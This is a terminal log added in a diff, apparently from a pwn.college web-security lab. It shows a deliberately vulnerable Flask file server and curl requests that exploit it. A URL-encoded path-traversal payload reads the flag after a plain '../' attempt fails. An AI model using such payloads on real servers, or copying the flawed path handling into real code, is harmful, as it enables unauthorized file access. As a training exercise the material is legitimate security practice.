@@ -1,0 +1,52 @@
+hacker@web-security~path-traversal-2:/challenge$ cat server 
+#!/usr/bin/exec-suid -- /usr/bin/python3 -I
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/serve", methods=["GET"])
+@app.route("/serve/<path:path>", methods=["GET"])
+def challenge(path="index.html"):
+    requested_path = app.root_path + "/files/" + path.strip("/.")
+    print(f"DEBUG: {requested_path=}")
+    try:
+        return open(requested_path).read()
+    except PermissionError:
+        flask.abort(403, requested_path)
+    except FileNotFoundError:
+        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
+    except Exception as e:
+        flask.abort(500, requested_path + ":" + str(e))
+
+
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+
+hacker@web-security~path-traversal-2:/$ curl http://challenge.localhost:80/serve/fortunes/fortune-1.txt
+DEBUG: requested_path='/challenge/files/fortunes/fortune-1.txt'
+127.0.0.1 - - [19/Oct/2025 09:20:13] "GET /serve/fortunes/fortune-1.txt HTTP/1.1" 200 -
+You can observe a lot just by watching.
+        -- Yogi Berra
+hacker@web-security~path-traversal-2:/$ curl http://challenge.localhost:80/serve/fortunes/../../flag
+127.0.0.1 - - [19/Oct/2025 09:20:30] "GET /flag HTTP/1.1" 404 -
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
+hacker@web-security~path-traversal-2:/$ curl http://challenge.localhost:80/serve/fortunes/..%2F..%2Fflag
+DEBUG: requested_path='/challenge/files/fortunes/../../flag'
+127.0.0.1 - - [19/Oct/2025 09:20:50] "GET /serve/fortunes/..%2F..%2Fflag HTTP/1.1" 404 -
+<!doctype html>
+<html lang=en>
+<title>404 Not Found</title>
+<h1>Not Found</h1>
+<p>No /challenge/files/fortunes/../../flag from directory /challenge</p>
+hacker@web-security~path-traversal-2:/$ curl http://challenge.localhost:80/serve/fortunes/..%2F..%2F..%2Fflag
+DEBUG: requested_path='/challenge/files/fortunes/../../../flag'
+127.0.0.1 - - [19/Oct/2025 09:21:14] "GET /serve/fortunes/..%2F..%2F..%2Fflag HTTP/1.1" 200 -
+pwn.college{wM1To9SutIw22SCS4vCYUusFsfu.dJjN1YDL1AjM5MzW}
